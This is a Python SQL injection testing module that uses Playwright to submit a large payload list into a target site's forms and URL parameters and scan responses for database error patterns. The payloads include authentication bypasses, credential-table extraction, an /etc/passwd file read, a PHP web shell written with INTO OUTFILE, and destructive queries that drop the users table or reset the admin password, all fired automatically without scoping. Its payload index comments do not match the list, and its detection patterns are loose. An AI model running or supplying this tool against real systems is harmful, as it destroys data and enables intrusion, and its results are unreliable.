"""
SQL Injection Penetration Testing Module - Simplified Version
"""

import re
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass
from playwright.sync_api import Page, Locator


@dataclass
class SQLPayload:
    name: str
    payload: str
    risk_level: str


@dataclass
class SQLResult:
    input_name: str
    payload: str
    is_vulnerable: bool
    response_snippet: str
    risk_level: str
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert SQLResult to dictionary for JSON serialization"""
        return {
            'input_name': self.input_name,
            'payload': self.payload,
            'is_vulnerable': self.is_vulnerable,
            'response_snippet': self.response_snippet,
            'risk_level': self.risk_level
        }


class SQLPentester:
    """SQL Injection Penetration Tester - Simplified"""
    
    def __init__(self):
        self.payloads = [
            # Basic SQL Injection
            SQLPayload("Basic Union", "' UNION SELECT 1,2,3--", "high"),
            SQLPayload("Union All", "' UNION ALL SELECT 1,2,3--", "high"),
            SQLPayload("Union Null", "' UNION SELECT NULL,NULL,NULL--", "high"),
            
            # Boolean-based Blind SQL Injection
            SQLPayload("Boolean True", "' OR 1=1--", "medium"),
            SQLPayload("Boolean False", "' AND 1=2--", "medium"),
            SQLPayload("Boolean True 2", "' OR '1'='1", "medium"),
            SQLPayload("Boolean False 2", "' AND '1'='2", "medium"),
            SQLPayload("Boolean True 3", "1' OR '1'='1'--", "medium"),
            SQLPayload("Boolean False 3", "1' AND '1'='2'--", "medium"),
            
            # Time-based Blind SQL Injection
            SQLPayload("Time Delay MySQL", "' OR SLEEP(5)--", "high"),
            SQLPayload("Time Delay PostgreSQL", "'; SELECT pg_sleep(5)--", "high"),
            SQLPayload("Time Delay MSSQL", "'; WAITFOR DELAY '00:00:05'--", "high"),
            SQLPayload("Time Delay Oracle", "' OR (SELECT COUNT(*) FROM ALL_USERS WHERE ROWNUM<=1 AND (SELECT COUNT(*) FROM ALL_USERS)>0 AND 1=1) > 0--", "high"),
            
            # Authentication Bypass
            SQLPayload("Auth Bypass 1", "' OR '1'='1", "critical"),
            SQLPayload("Auth Bypass 2", "admin'--", "critical"),
            SQLPayload("Auth Bypass 3", "admin'/*", "critical"),
            SQLPayload("Auth Bypass 4", "' OR 1=1#", "critical"),
            SQLPayload("Auth Bypass 5", "' OR 'x'='x", "critical"),
            SQLPayload("Auth Bypass 6", "') OR ('1'='1", "critical"),
            SQLPayload("Auth Bypass 7", "' OR 1=1 LIMIT 1--", "critical"),
            
            # Error-based SQL Injection
            SQLPayload("Error MySQL", "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "high"),
            SQLPayload("Error PostgreSQL", "'; SELECT * FROM pg_stat_activity--", "high"),
            SQLPayload("Error MSSQL", "'; SELECT @@version--", "high"),
            SQLPayload("Error Oracle", "' UNION SELECT banner FROM v$version--", "high"),
            
            # Union-based SQL Injection
            SQLPayload("Union Version", "' UNION SELECT @@version,2,3--", "high"),
            SQLPayload("Union Database", "' UNION SELECT database(),2,3--", "high"),
            SQLPayload("Union User", "' UNION SELECT user(),2,3--", "high"),
            SQLPayload("Union Tables", "' UNION SELECT table_name,2,3 FROM information_schema.tables--", "high"),
            SQLPayload("Union Columns", "' UNION SELECT column_name,2,3 FROM information_schema.columns--", "high"),
            
            # Stacked Queries
            SQLPayload("Stacked Query 1", "'; DROP TABLE users--", "critical"),
            SQLPayload("Stacked Query 2", "'; INSERT INTO users VALUES ('hacker','password')--", "critical"),
            SQLPayload("Stacked Query 3", "'; UPDATE users SET password='hacked' WHERE username='admin'--", "critical"),
            
            # Second Order SQL Injection
            SQLPayload("Second Order 1", "admin'", "medium"),
            SQLPayload("Second Order 2", "admin' OR '1'='1", "medium"),
            
            # WAF Bypass Techniques
            SQLPayload("WAF Bypass 1", "'/**/UNION/**/SELECT/**/1,2,3--", "high"),
            SQLPayload("WAF Bypass 2", "'%20UNION%20SELECT%201,2,3--", "high"),
            SQLPayload("WAF Bypass 3", "'+UNION+SELECT+1,2,3--", "high"),
            SQLPayload("WAF Bypass 4", "'/*!UNION*//*!SELECT*/1,2,3--", "high"),
            SQLPayload("WAF Bypass 5", "'/**/UNION/**/ALL/**/SELECT/**/1,2,3--", "high"),
            
            # Encoding Techniques
            SQLPayload("URL Encoded", "%27%20UNION%20SELECT%201,2,3--", "high"),
            SQLPayload("Double Encoded", "%2527%2520UNION%2520SELECT%25201,2,3--", "high"),
            SQLPayload("Hex Encoded", "0x2720554e494f4e2053454c45435420312c322c332d2d", "high"),
            
            # Alternative Comment Syntax
            SQLPayload("Comment Hash", "' UNION SELECT 1,2,3#", "high"),
            SQLPayload("Comment Slash", "' UNION SELECT 1,2,3/*", "high"),
            SQLPayload("Comment Double", "' UNION SELECT 1,2,3-- -", "high"),
            
            # Database Specific
            SQLPayload("MySQL Specific", "' UNION SELECT @@version,@@datadir,@@hostname--", "high"),
            SQLPayload("PostgreSQL Specific", "'; SELECT version(),current_database(),current_user--", "high"),
            SQLPayload("MSSQL Specific", "'; SELECT @@version,db_name(),user_name()--", "high"),
            SQLPayload("Oracle Specific", "' UNION SELECT banner FROM v$version WHERE rownum=1--", "high"),
            
            # Advanced Techniques
            SQLPayload("Subquery", "' UNION SELECT (SELECT COUNT(*) FROM information_schema.tables),2,3--", "high"),
            SQLPayload("Conditional", "' UNION SELECT IF(1=1,1,0),2,3--", "high"),
            SQLPayload("Case Statement", "' UNION SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END,2,3--", "high"),
            
            # Information Gathering
            SQLPayload("Info Tables", "' UNION SELECT table_name,table_schema,3 FROM information_schema.tables LIMIT 1--", "high"),
            SQLPayload("Info Columns", "' UNION SELECT column_name,data_type,3 FROM information_schema.columns LIMIT 1--", "high"),
            SQLPayload("Info Users", "' UNION SELECT user,host,3 FROM mysql.user LIMIT 1--", "high"),
            
            # File Operations (Dangerous)
            SQLPayload("File Read", "' UNION SELECT LOAD_FILE('/etc/passwd'),2,3--", "critical"),
            SQLPayload("File Write", "' UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/tmp/shell.php'--", "critical"),
            
            # NoSQL Injection
            SQLPayload("NoSQL 1", "' || '1'=='1", "medium"),
            SQLPayload("NoSQL 2", "' || 1==1", "medium"),
            SQLPayload("NoSQL 3", "'; return true; //", "medium"),
            
            # Polyglot SQL Injection
            SQLPayload("Polyglot", "' UNION SELECT 1,2,3; DROP TABLE users; --", "critical")
        ]
    
    def detect_sql_in_response(self, response_text: str, payload: str) -> Tuple[bool, str]:
        """Deteksi SQL injection dalam response dengan pattern yang lebih komprehensif"""
        # Cek error messages dari berbagai database
        sql_errors = [
            # MySQL Errors
            r"mysql_fetch_array",
            r"mysql_fetch_assoc",
            r"mysql_fetch_row",
            r"mysql_num_rows",
            r"mysql_query",
            r"mysql_connect",
            r"mysql_select_db",
            r"mysql_error",
            r"MySQLSyntaxErrorException",
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_",
            r"valid MySQL result",
            r"MySqlClient\.",
            r"check the manual that corresponds to your MySQL server version",
            r"MySQL server has gone away",
            r"Access denied for user",
            r"Unknown column",
            r"Table.*doesn't exist",
            r"Duplicate entry",
            r"Data too long for column",
            
            # PostgreSQL Errors
            r"PostgreSQL query failed",
            r"PostgreSQL.*ERROR",
            r"pg_query\(\)",
            r"pg_exec\(\)",
            r"pg_connect\(\)",
            r"pg_select_db\(\)",
            r"pg_error\(\)",
            r"PostgreSQL.*syntax error",
            r"relation.*does not exist",
            r"column.*does not exist",
            r"permission denied",
            r"authentication failed",
            
            # MSSQL Errors
            r"Microsoft OLE DB Provider",
            r"SQLServer JDBC Driver",
            r"SQLServer.*error",
            r"Microsoft.*ODBC.*SQL Server",
            r"SQL Server.*error",
            r"System\.Data\.SqlClient",
            r"SqlException",
            r"Invalid object name",
            r"Invalid column name",
            r"Login failed",
            r"Access denied",
            
            # Oracle Errors
            r"ORA-01756",
            r"ORA-00933",
            r"ORA-00936",
            r"ORA-00942",
            r"ORA-00904",
            r"ORA-01722",
            r"ORA-01789",
            r"ORA-00907",
            r"Oracle.*error",
            r"Oracle.*exception",
            r"Oracle.*syntax error",
            
            # SQLite Errors
            r"SQLite.*error",
            r"SQLite.*exception",
            r"SQLite.*syntax error",
            r"no such table",
            r"no such column",
            r"database is locked",
            
            # Generic SQL Errors
            r"SQL.*error",
            r"SQL.*exception",
            r"SQL.*syntax error",
            r"database.*error",
            r"query.*failed",
            r"connection.*failed",
            r"authentication.*failed",
            r"access.*denied",
            r"permission.*denied",
            r"invalid.*syntax",
            r"unexpected.*token",
            r"near.*syntax error",
            r"unrecognized.*token",
            
            # Framework-specific Errors
            r"ActiveRecord::StatementInvalid",
            r"ActiveRecord::RecordNotFound",
            r"ActiveRecord::RecordInvalid",
            r"PDO.*Exception",
            r"PDO.*error",
            r"mysqli.*error",
            r"mysqli.*exception",
            r"SQLException",
            r"SQL.*Exception",
            r"Database.*Exception",
            r"Query.*Exception",
            
            # Time-based Detection Patterns
            r"sleep\(.*\)",
            r"waitfor.*delay",
            r"pg_sleep\(.*\)",
            r"benchmark\(.*\)",
            r"delay\(.*\)",
            
            # Union-based Detection
            r"union.*select",
            r"select.*from",
            r"information_schema",
            r"mysql\.user",
            r"pg_user",
            r"sys\.users",
            r"all_users",
            r"dba_users",
            
            # Information Disclosure
            r"@@version",
            r"version\(\)",
            r"database\(\)",
            r"user\(\)",
            r"current_user",
            r"session_user",
            r"system_user",
            r"host_name\(\)",
            r"db_name\(\)",
            r"serverproperty",
            
            # File Operations
            r"load_file\(.*\)",
            r"into.*outfile",
            r"into.*dumpfile",
            r"bulk.*insert",
            r"openrowset",
            r"opendatasource",
            
            # Stacked Queries
            r"drop.*table",
            r"create.*table",
            r"alter.*table",
            r"insert.*into",
            r"update.*set",
            r"delete.*from",
            r"truncate.*table",
            
            # NoSQL Injection
            r"mongodb.*error",
            r"mongo.*exception",
            r"nosql.*error",
            r"document.*not found",
            r"collection.*not found",
            r"index.*not found"
        ]
        
        for pattern in sql_errors:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True, f"SQL Error detected: {pattern[:50]}..."
        
        # Cek apakah payload muncul dalam response
        if payload in response_text:
            return True, "Payload reflected"
        
        # Cek pattern SQL injection yang berhasil
        sql_success_patterns = [
            r"union.*select",
            r"select.*from.*information_schema",
            r"@@version",
            r"version\(\)",
            r"database\(\)",
            r"user\(\)",
            r"current_user",
            r"mysql\.user",
            r"pg_user",
            r"sys\.users",
            r"all_users",
            r"dba_users"
        ]
        
        for pattern in sql_success_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True, f"SQL injection success pattern: {pattern[:50]}..."
        
        return False, ""
    
    def test_form_inputs(self, page: Page, form_locator: Locator) -> List[SQLResult]:
        """Test SQL injection pada form inputs dengan payload yang lebih strategis"""
        results = []
        
        try:
            # Ambil semua input dalam form
            inputs = form_locator.locator('input[type="text"], input[type="password"], textarea').all()
            
            for input_elem in inputs:
                input_name = input_elem.get_attribute('name') or 'unnamed'
                
                # Test dengan payload strategis (bukan semua payload)
                strategic_payloads = [
                    self.payloads[0],   # Basic Union
                    self.payloads[6],  # Boolean True
                    self.payloads[7],  # Boolean False
                    self.payloads[12], # Auth Bypass 1
                    self.payloads[13], # Auth Bypass 2
                    self.payloads[18], # Error MySQL
                    self.payloads[19], # Error PostgreSQL
                    self.payloads[20], # Error MSSQL
                    self.payloads[21], # Error Oracle
                    self.payloads[22], # Union Version
                    self.payloads[23], # Union Database
                    self.payloads[24], # Union User
                    self.payloads[25], # Union Tables
                    self.payloads[26], # Union Columns
                    self.payloads[27], # Stacked Query 1
                    self.payloads[28], # Stacked Query 2
                    self.payloads[29], # Stacked Query 3
                    self.payloads[30], # WAF Bypass 1
                    self.payloads[31], # WAF Bypass 2
                    self.payloads[32], # WAF Bypass 3
                    self.payloads[33], # WAF Bypass 4
                    self.payloads[34], # WAF Bypass 5
                    self.payloads[35], # URL Encoded
                    self.payloads[36], # Double Encoded
                    self.payloads[37], # Hex Encoded
                    self.payloads[38], # Comment Hash
                    self.payloads[39], # Comment Slash
                    self.payloads[40], # Comment Double
                    self.payloads[41], # MySQL Specific
                    self.payloads[42], # PostgreSQL Specific
                    self.payloads[43], # MSSQL Specific
                    self.payloads[44], # Oracle Specific
                    self.payloads[45], # Subquery
                    self.payloads[46], # Conditional
                    self.payloads[47], # Case Statement
                    self.payloads[48], # Info Tables
                    self.payloads[49], # Info Columns
                    self.payloads[50], # Info Users
                    self.payloads[51], # File Read
                    self.payloads[52], # File Write
                    self.payloads[53], # NoSQL 1
                    self.payloads[54], # NoSQL 2
                    self.payloads[55], # NoSQL 3
                    self.payloads[56], # Polyglot
                ]
                
                for payload_obj in strategic_payloads:
                    try:
                        # Wait for element to be visible and enabled
                        input_elem.wait_for(state="visible", timeout=5000)
                        input_elem.clear()
                        input_elem.fill(payload_obj.payload)
                        
                        # Submit form
                        submit_btn = form_locator.locator('input[type="submit"], button[type="submit"]').first
                        if submit_btn.count() > 0:
                            submit_btn.click()
                            page.wait_for_timeout(2000)
                        
                        # Ambil response
                        response_text = page.content()
                        
                        # Deteksi SQL injection
                        is_vulnerable, snippet = self.detect_sql_in_response(response_text, payload_obj.payload)
                        
                        result = SQLResult(
                            input_name=input_name,
                            payload=payload_obj.payload,
                            is_vulnerable=is_vulnerable,
                            response_snippet=snippet[:200] if snippet else "",
                            risk_level=payload_obj.risk_level
                        )
                        
                        results.append(result.to_dict())
                        
                        # Jika ditemukan vulnerability, lanjut ke payload berikutnya
                        if is_vulnerable:
                            break
                            
                    except Exception as e:
                        print(f"Error testing {input_name} with {payload_obj.name}: {e}")
                        continue
        
        except Exception as e:
            print(f"Error in SQL form testing: {e}")
        
        return results
    
    def test_url_parameters(self, page: Page, url: str) -> List[Dict[str, Any]]:
        """Test SQL injection pada URL parameters"""
        results = []
        
        try:
            # Parse URL untuk mendapatkan parameters
            from urllib.parse import urlparse, parse_qs
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            
            if not params:
                return results
            
            # Test setiap parameter dengan payload strategis
            strategic_payloads = [
                self.payloads[0],   # Basic Union
                self.payloads[6],   # Boolean True
                self.payloads[7],   # Boolean False
                self.payloads[12], # Auth Bypass 1
                self.payloads[13], # Auth Bypass 2
                self.payloads[18], # Error MySQL
                self.payloads[19], # Error PostgreSQL
                self.payloads[20], # Error MSSQL
                self.payloads[21], # Error Oracle
                self.payloads[22], # Union Version
                self.payloads[23], # Union Database
                self.payloads[24], # Union User
                self.payloads[25], # Union Tables
                self.payloads[26], # Union Columns
                self.payloads[27], # Stacked Query 1
                self.payloads[28], # Stacked Query 2
                self.payloads[29], # Stacked Query 3
                self.payloads[30], # WAF Bypass 1
                self.payloads[31], # WAF Bypass 2
                self.payloads[32], # WAF Bypass 3
                self.payloads[33], # WAF Bypass 4
                self.payloads[34], # WAF Bypass 5
                self.payloads[35], # URL Encoded
                self.payloads[36], # Double Encoded
                self.payloads[37], # Hex Encoded
                self.payloads[38], # Comment Hash
                self.payloads[39], # Comment Slash
                self.payloads[40], # Comment Double
                self.payloads[41], # MySQL Specific
                self.payloads[42], # PostgreSQL Specific
                self.payloads[43], # MSSQL Specific
                self.payloads[44], # Oracle Specific
                self.payloads[45], # Subquery
                self.payloads[46], # Conditional
                self.payloads[47], # Case Statement
                self.payloads[48], # Info Tables
                self.payloads[49], # Info Columns
                self.payloads[50], # Info Users
                self.payloads[51], # File Read
                self.payloads[52], # File Write
                self.payloads[53], # NoSQL 1
                self.payloads[54], # NoSQL 2
                self.payloads[55], # NoSQL 3
                self.payloads[56], # Polyglot
            ]
            
            for param_name, param_values in params.items():
                for payload_obj in strategic_payloads:
                    try:
                        # Buat URL dengan payload
                        test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{param_name}={payload_obj.payload}"
                        
                        # Navigate ke URL dengan payload
                        page.goto(test_url)
                        page.wait_for_load_state('networkidle')
                        
                        # Ambil response
                        response_text = page.content()
                        
                        # Deteksi SQL injection
                        is_vulnerable, snippet = self.detect_sql_in_response(response_text, payload_obj.payload)
                        
                        result = {
                            'parameter_name': param_name,
                            'payload': payload_obj.payload,
                            'is_vulnerable': is_vulnerable,
                            'response_snippet': snippet[:200] if snippet else "",
                            'risk_level': payload_obj.risk_level,
                            'test_url': test_url
                        }
                        
                        results.append(result)
                        
                        # Jika ditemukan vulnerability, lanjut ke payload berikutnya
                        if is_vulnerable:
                            break
                            
                    except Exception as e:
                        print(f"Error testing parameter {param_name} with {payload_obj.name}: {e}")
                        continue
        
        except Exception as e:
            print(f"Error in SQL URL parameter testing: {e}")
        
        return results

    def run_sql_test(self, page: Page, url: str) -> Dict[str, Any]:
        """Jalankan SQL injection test pada halaman"""
        results = {
            'url': url,
            'form_tests': [],
            'url_parameter_tests': [],
            'summary': {
                'total_tests': 0,
                'vulnerabilities_found': 0,
                'high_vulnerabilities': 0,
                'critical_vulnerabilities': 0
            }
        }
        
        try:
            page.goto(url)
            page.wait_for_load_state('networkidle')
            
            # Test semua form
            forms = page.locator('form').all()
            for form in forms:
                form_results = self.test_form_inputs(page, form)
                results['form_tests'].extend(form_results)
            
            # Test URL parameters
            url_results = self.test_url_parameters(page, url)
            results['url_parameter_tests'].extend(url_results)
            
            # Calculate summary
            all_results = results['form_tests'] + results['url_parameter_tests']
            results['summary']['total_tests'] = len(all_results)
            results['summary']['vulnerabilities_found'] = len([r for r in all_results if r.get('is_vulnerable', False)])
            results['summary']['high_vulnerabilities'] = len([r for r in all_results if r.get('is_vulnerable', False) and r.get('risk_level') == 'high'])
            results['summary']['critical_vulnerabilities'] = len([r for r in all_results if r.get('is_vulnerable', False) and r.get('risk_level') == 'critical'])
        
        except Exception as e:
            results['error'] = str(e)
        
        return results